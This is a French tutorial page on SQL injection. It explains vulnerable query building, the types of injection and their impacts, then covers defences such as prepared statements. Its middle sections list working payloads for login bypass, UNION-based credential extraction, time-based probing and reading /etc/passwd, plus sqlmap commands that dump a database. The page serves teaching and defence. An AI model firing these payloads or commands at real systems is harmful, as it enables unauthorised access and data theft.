---
title: "Injections SQL (SQLi)"
domain: "Applied Sciences"
subdomain: "Computer Science > Security > Web Security"
tags: [sciences-appliquées, informatique, sécurité]
date: "2025-01-15"
---

# Injections SQL (SQLi)

Une injection SQL, c'est quand un attaquant insère du code SQL dans un champ de saisie pour manipuler la base de données d'une application.

C'est l'une des vulnérabilités web les plus anciennes et encore très répandues — classée dans le Top 3 OWASP.


## Principe de base

Une application vulnérable construit sa requête SQL en collant directement l'entrée utilisateur :

```python
# Code vulnérable
query = "SELECT * FROM users WHERE username = '" + username + "'"
```

Si l'utilisateur tape `admin' OR '1'='1`, la requête devient :
```sql
SELECT * FROM users WHERE username = 'admin' OR '1'='1'
```
→ Retourne **tous les utilisateurs** car `'1'='1'` est toujours vrai.


## Types d'injections SQL

### In-band (résultat visible directement)
| Type | Description |
|------|-------------|
| **Error-based** | Forcer une erreur SQL pour extraire de l'info |
| **Union-based** | Ajouter un `UNION SELECT` pour afficher d'autres données |

### Blind (pas de résultat visible)
| Type | Description |
|------|-------------|
| **Boolean-based** | Poser des questions vrai/faux (la page change selon la réponse) |
| **Time-based** | Utiliser `SLEEP()` pour inférer les données par les délais |

### Out-of-band
Extraire les données via un canal différent (DNS, HTTP vers un serveur contrôlé).


## Exemples d'exploits classiques

```sql
-- Bypass d'authentification
' OR 1=1 --
admin'--
' OR 'x'='x

-- Union-based : lister les tables
' UNION SELECT table_name, NULL FROM information_schema.tables --

-- Extraire les colonnes d'une table
' UNION SELECT column_name, NULL FROM information_schema.columns WHERE table_name='users' --

-- Extraire les données
' UNION SELECT username, password FROM users --

-- Time-based blind (MySQL)
' AND SLEEP(5) --

-- Lire un fichier (si droits suffisants)
' UNION SELECT LOAD_FILE('/etc/passwd'), NULL --
```


## Impacts d'une injection SQL réussie

| Impact | Description |
|--------|-------------|
| Contournement d'authentification | Connexion sans identifiants valides, potentiellement en admin |
| Divulgation d'informations | Accès à des données sensibles (données personnelles, secrets) |
| Altération d'intégrité | Modification du contenu de la base de données |
| Indisponibilité | Suppression de données ou de logs d'audit |
| Exécution de commandes | Via `xp_cmdshell` (SQL Server) ou procédures externes (Oracle) |

## Outils

| Outil | Usage |
|-------|-------|
| [SQLMap](https://sqlmap.org/) | Automatisation complète des SQLi |
| [Burp Suite](https://portswigger.net/burp) | Interception et test manuel |

```bash
# SQLMap basique
sqlmap -u "http://site.com/page?id=1"

# Avec dump de la base
sqlmap -u "http://site.com/page?id=1" --dbs
sqlmap -u "http://site.com/page?id=1" -D nom_db --tables
sqlmap -u "http://site.com/page?id=1" -D nom_db -T users --dump
```


## Protection

### Requêtes préparées (Prepared Statements) — LA solution
```python
# Python avec paramètres liés
cursor.execute("SELECT * FROM users WHERE username = %s", (username,))
```

```php
// PHP PDO
$stmt = $pdo->prepare("SELECT * FROM users WHERE username = ?");
$stmt->execute([$username]);
```

### Autres mesures
- **ORM** (SQLAlchemy, Hibernate) — gèrent les paramètres automatiquement
- **Validation des entrées** — liste blanche de caractères autorisés
- **Moindre privilège** — l'utilisateur DB ne doit pas avoir les droits `FILE`, `DROP`, etc.
- **WAF** (Web Application Firewall) — détecte les patterns SQLi
- **Gestion des erreurs** — ne jamais afficher les erreurs SQL en production


## Ressources
- Cheatsheet complète : [tib3rius.com/sqli](https://tib3rius.com/sqli)
- Labs : [PortSwigger Web Security Academy](https://portswigger.net/web-security/sql-injection)
